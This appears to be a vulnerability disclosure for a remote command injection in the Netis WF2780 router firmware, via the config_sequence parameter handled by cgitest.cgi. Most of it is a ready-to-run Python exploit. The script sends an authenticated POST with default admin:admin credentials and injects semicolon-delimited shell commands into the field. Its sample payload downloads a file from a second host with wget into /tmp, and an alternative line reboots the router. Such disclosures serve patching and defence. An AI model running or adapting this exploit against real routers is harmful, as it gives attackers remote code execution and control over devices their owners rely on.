# Netis WF2780 V2.1.40144 Router Command Injection via config_sequence in other_para



Affect device: Netis WF2780 V2.1.40144 (https://www.netis-systems.com/Suppory/de_details/id/1/de/189.html)

Vulnerability Type: Command Injection

Impact: Remote Code Execution(RCE)

## Vulnerability description

There is a remote command injection in the function `other_para` of the file `bin/cgitest.cgi`, we can control the `config_sequence` to attack.

`get_form_value`\'s function is to get string value from http body.

![image-20240208152007772](./img/image-20240208152007772.png)



![image-20240208152035954](./img/image-20240208152035954.png)



## POC

```python
#!/usr/bin/env python3

import urllib.parse
import socket 

def main(ip, port, cmd):
    cmd = ";"+cmd+";"
    body = "config_sequence=" + urllib.parse.quote(cmd)
    request = "POST /cgi-bin-igd/netcore_set.cgi HTTP/1.1\r\n"
    request += f"Host: {ip}\r\n"
    request += "Content-Length: {}\r\n".format(len(body))
    request += "Authorization: Basic YWRtaW46YWRtaW4=\r\n"
    request += "Cache-Control: no-cache\r\n"
    request += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36\r\n"
    request += "content-type: application/x-www-form-urlencoded\r\n"
    request += f"Origin: http://{ip}\r\n"
    request += f"Referer: http://{ip}/index.htm\r\n"
    request += "Accept-Encoding: gzip, deflate\r\n"
    request += "Accept-Language: zh-CN,zh;q=0.9\r\n"
    request += "Connection: close\r\n\r\n"
    request += body
    c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c.settimeout(8)
    c.connect((ip,port))
    c.send(request.encode())
    print(c.recv(1024))


if __name__ == "__main__":
    main("192.168.1.1", 80, "cd /tmp;wget http://192.168.1.2:8888/a")
    #main("192.168.1.1", 80, "reboot")
```



![image-20240208152946137](./img/image-20240208152946137.png)